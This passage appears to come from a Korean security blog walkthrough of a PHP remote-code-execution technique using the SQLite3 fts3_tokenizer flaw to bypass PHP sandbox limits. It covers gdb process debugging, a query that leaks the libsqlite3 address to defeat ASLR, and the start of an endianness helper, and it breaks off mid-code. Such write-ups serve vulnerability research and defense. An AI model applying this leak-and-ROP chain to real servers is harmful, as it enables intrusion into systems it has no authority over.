9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP RCE 1-day case</h1>\n<ul>\n<li>취약한 대상 애플리케이션 환경에서 PHP를 사용하고 있으며 이에 대한 공격 벡터가 존재하는 경우 PHP sandbox를 우회하기 위해 SQLite 모듈을 활용하고, 최종적으로 RCE를 수행하는 과정에 대해서 설명하도록 하겠습니다.</li>\n</ul>\n<h3 id=\"php-debugging\" style=\"position:relative;\"><a href=\"#php-debugging\" aria-label=\"php debugging permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Debugging</h3>\n<ul>\n<li>취약한 모듈을 분석하기 위해 php+apache 디버깅을 활용하여 동적 분석을 진행한다.</li>\n</ul>\n<p><strong>gdb를 활용하여 process debugging 진행</strong></p>\n<ul>\n<li>대상 PID를 gdb로 연결하기 위해 <code class=\"language-text\">getmypid</code> 출력을 한후 sleep 함수를 사용해 유효 상태로 대기시키는 동안 연결을 진행하도록 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>구현된 코드를 실행한 후 출력된 PID 를 gdb에 연결을 진행한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span>root@localhost html<span class=\"token punctuation\">]</span><span class=\"token comment\"># curl http://localhost/dbg.php</span>\n<span class=\"token number\">1876</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">p</code> 옵션을 활용하여 PID 번호 매칭하여 디버깅을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gdb <span class=\"token operator\">-</span>p <span class=\"token punctuation\">[</span>pid<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>구현된 환경에서 gdb를 활용하여 프로세스 디버깅 상태가 완료된 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY012ObQuCQBCEL1MrKj297FUzNcq004IsI/r/P2tiFyLpwzDssvvMiEN+wy6tkO4vSLIawSKDIyP4swSj8RK9vkTf8mHaikWzYXrs1kDBUzGmbgjXi9hFqVvU1zfO1RPFuQUF5MWdRUGkTXTioImz/gPO4MiQ3R4G7KKsntD1C3nR4Fg07HGqsQpzqCDBVIacTKKmXaBp+zBMCWG4PJO44al8gMDbRHOj+XLPafTYPf7CfkDF0O7+A385ZDlcDFOsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png\"\n        srcset=\"/static/2e73bb069d875686184fee6edfb89f4e/e9ff0/1.png 180w,\n/static/2e73bb069d875686184fee6edfb89f4e/f21e7/1.png 360w,\n/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png 720w,\n/static/2e73bb069d875686184fee6edfb89f4e/302a4/1.png 1080w,\n/static/2e73bb069d875686184fee6edfb89f4e/511f0/1.png 1172w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 Process 매핑된 라이브러리 주소를 확인하여 오프셋 계산을 통해 ROP 기법을 수행할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoklEQVQI112Oyw6CMBREEXQNLW8ILdAiIGBBE2Mw/v9njemNC+Nikrs4c+44l/mJ2ezo+jtUt8Fsb7R6pXsxOxplYJkoUXBcH+6R4eAF8E4MARcI45bCoxo+q+Bc1xcVRbOgqEYSsbCGqGcM0wNxqiCbBVlx/hNy5OVAXCUnCjG6v1HBFu2XNO8QhBJxqlFWI3wmkGSa1ljRrzDg8ruwoVjmA2MTT0rI5KL2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png\"\n        srcset=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/e9ff0/2.png 180w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/f21e7/2.png 360w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png 720w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/eac55/2.png 887w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>여기까지 간단하게 gdb를 사용해 동적 프로세스 디버깅을 진행하였다. 다음은 실제 취약한 sqlite3 모듈을 분석하여 <code class=\"language-text\">Code Execution</code>이 가능한 부분을 exploitation 하도록 할께요</li>\n</ul>\n<h3 id=\"safe-mode-bypass\" style=\"position:relative;\"><a href=\"#safe-mode-bypass\" aria-label=\"safe mode bypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Safe Mode Bypass</h3>\n<ul>\n<li>PHP가 사용하는 모듈에 대한 취약점을 활용하여 Code Execution 을 진행해 System 함수를 실행하는 게 목표</li>\n<li><code class=\"language-text\">Code Execution</code> 을 수행하는데 있어서 Use-After-Free, Buffer-OverFlow 등 많은 CVE들이 존재하며 다음 <code class=\"language-text\">CVE-2015-0273</code>, <code class=\"language-text\">CVE-2015-6834</code> 등이 있습니다.</li>\n</ul>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-0273\">CVE-2015-0273</a></p>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-6834\">CVE-2015-6834</a></p>\n<ul>\n<li>PHP 모듈에 존재하는 취약점을 이용하여 PHP 버전에 의존하지 않고 Exploitation을 진행할 수 있습니다.</li>\n</ul>\n<h3 id=\"php-sqlite-모듈-php-53\" style=\"position:relative;\"><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\" aria-label=\"php sqlite 모듈 php 53 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP SQLite 모듈 (PHP 5.3≥)</h3>\n<ul>\n<li>이번에는 SQLite 모듈에 대한 취약점 분석을 진행하도록 하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQY03VQXW+CQBC8+kF9KkgPTuCOO4FCAbHGaGtN+tLE//+TptmNktakD5Pbm83Ozqw4vH+jG07QeYeq3qOodpBxgaY9oOmOSLKGucy0EBMfk9mSQXUoHXK3gV0PI8TH+YKmPWKV1jC2ZzwFBrYY4Iot4lXFnEpe/gg+TAP4S8MLU/06QpzOF/TDJwu6cstuIlWxWwIJkTD17x0GoWXnlE7bHlneQez2X1iXbzxo3ObqULMIIVIlc/GdQ6r9MEeqW15GouRW0P1oUF1JGqbb0D2Il6rk7RT9v8gqqTkup6CYM+8Z80fJ8BaS/94iYtx69JLIb8HpPBznbvgB8BObv94Ag/QAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png\"\n        srcset=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/e9ff0/3.png 180w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/f21e7/3.png 360w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png 720w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/84cc5/3.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 386px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5UlEQVQY002N0W6CQBREt2qpNlZbq8QKIVRAYGFZYNmyimJbk/7/H03DfWj6cDKTm5szLM1aFNUZsrqA54Z6XhyRCYPV2qd+SBqUqkecauzDEqPJC+7Gz5QD4/vVH8x0P/gwN3r0gwLa3EgeHmr4+wJBVNLIfLHDxHqFNd2QbICNlsT/zkTZoW6ueHNieO+C5GneYuvEyMQRrschZAcuDGR9oSzrHvOFA2u2wfTRpqGHmU1jLEoUlP4iodKfcDyOmGvo9htVc0WleuzchG5DF/IEWZ2RcI1cnhDFCvY2xNoO8LR08QtnvnCMjsUBkwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png\"\n        srcset=\"/static/328a6c8043a5dfeb4cb733617a66114b/e9ff0/4.png 180w,\n/static/328a6c8043a5dfeb4cb733617a66114b/f21e7/4.png 360w,\n/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png 386w\"\n        sizes=\"(max-width: 386px) 100vw, 386px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>취약한 PHP 모듈의 SQLite3 버전은 3.6.20에 해당하며 이는 PHP 5.3 이상 부터 사용가능합니다.</li>\n</ul>\n<h1 id=\"sqlite3-fts3_tokenizer-취약점\" style=\"position:relative;\"><a href=\"#sqlite3-fts3_tokenizer-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite3 fts3_tokenizer 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite3 fts3_tokenizer 취약점</h1>\n<h3 id=\"fts3_tokenizer-overview\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-overview\" aria-label=\"fts3_tokenizer overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer Overview</h3>\n<ul>\n<li>sqlite3에서 fts3_tokenizer를 통한 검색을 위해 사용자 정의 <code class=\"language-text\">tokenizer</code> 를 등록할 수 있는 함수가 있습니다.</li>\n<li>fts3, 4 확장 모듈을 통해 사용자는 데이터베이스에 등록된 특수 테이블인 fts 테이블을 생성할 수 있습니다.</li>\n<li>데이터베이스내의 테이블에 대용량 문서가 많이 포함된 경우에도 하나 이상의 <code class=\"language-text\">token</code> 이 포함된 모든 행에 대해 데이터베이스를 효과적으로 쿼리 수행할 수 있습니다.</li>\n</ul>\n<aside>\n💡 SQLite FTS3,4 Document\n> [https://www.sqlite.org/fts3.html](https://www.sqlite.org/fts3.html)\n</aside>\n<h3 id=\"sqlite-fts3-기능을-활용한-검색-방안\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\" aria-label=\"sqlite fts3 기능을 활용한 검색 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 기능을 활용한 검색 방안</h3>\n<ul>\n<li>SQLite3 쿼리 수행시 Virtual Index Table을 생성하고 요소들을 추가하면서 인덱스를 생성합니다.</li>\n<li>생성된 인덱스(Token)를 <code class=\"language-text\">MATCH</code> 쿼리로 키워드를 검색합니다.</li>\n<li>SQLite는 Simple Tokenizer를 사용합니다.</li>\n</ul>\n<h3 id=\"사용자가-지정할-수-있는-tokenizer의-callback-처리-방식\" style=\"position:relative;\"><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\" aria-label=\"사용자가 지정할 수 있는 tokenizer의 callback 처리 방식 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</h3>\n<ul>\n<li>\n<p><code class=\"language-text\">xCreate</code> : Initialization</p>\n</li>\n<li>\n<p><code class=\"language-text\">xDestory</code> : destruction</p>\n</li>\n<li>\n<p><code class=\"language-text\">xOpen</code> : create a new tokenize cursor from a user input</p>\n</li>\n<li>\n<p><code class=\"language-text\">xClose</code> : close the cursor</p>\n</li>\n<li>\n<p><code class=\"language-text\">xNext</code> : yield next word</p>\n</li>\n<li>\n<p>callback function pointer 는 <code class=\"language-text\">sqlite3_tokenizer_module</code> 구조체에 등록되어 있습니다.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">struct sqlite3_tokenizer_module <span class=\"token punctuation\">{</span>\n <span class=\"token keyword type-declaration\">int</span> iVersion<span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xCreate<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span> <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> sqlite3_tokenizer <span class=\"token operator\">**</span>ppTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xDestroy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> nBytes<span class=\"token punctuation\">,</span> sqlite3_tokenizer_cursor <span class=\"token operator\">**</span>ppCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xClose<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xNext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">**</span>ppToken<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>pnBytes<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piStartOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piEndOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piPosition<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sqlite-fts3-취약점\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite fts3 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 취약점</h2>\n<h3 id=\"fts3-module-base-address-leaked\" style=\"position:relative;\"><a href=\"#fts3-module-base-address-leaked\" aria-label=\"fts3 module base address leaked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 module base address leaked</h3>\n<ul>\n<li>sqlite3 에는 <code class=\"language-text\">simple</code>, <code class=\"language-text\">porter</code>, <code class=\"language-text\">unicode64</code> … 과 같은 몇 가지의 build-in tokenizer가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">select <span class=\"token function\">hex</span><span class=\"token punctuation\">(</span><span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'simple'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t↑\n\t\t\t\t\t<span class=\"token number\">16</span> 진수 문자열 반환 <span class=\"token punctuation\">(</span>빅 엔디안 주소<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 653px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY04WPTQuCQBRFRy2IQEeDSrLR/JhqUtHMsCKxRSv///+5MRO1CKrF4b7NPY9L+OYAkTbYiCN2+QkeE4iSEixIQR0GolMQzVJohq3QB847PyEx38NfZZAZ8VIhn6y3tSIIc1DHh2UzjMZzGMPJV5kSZsUFbdejqm+4dj2a8x1hXCipyBqFlEr5ggmY1PstlOWyajFzOaZuAsteghDzOVPm65bo9O/kB8BLZIICcAz5AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png\"\n        srcset=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e9ff0/5.png 180w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/f21e7/5.png 360w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png 653w\"\n        sizes=\"(max-width: 653px) 100vw, 653px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">fts_tokenizer</code> 는 등록된 tokenizer의 주소를 <code class=\"language-text\">BLOB</code> 인코딩되어 반환하게 되고 built-in-tokenizer를 Query 하게 되면 lib-sqlite3 라이브러리 메모리 영역의 주소가 노출됩니다.</li>\n<li>해당 주소를 기반으로 ASAR을 우회하기 위해 리틀 엔디안으로 변환 작업을 진행합시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token 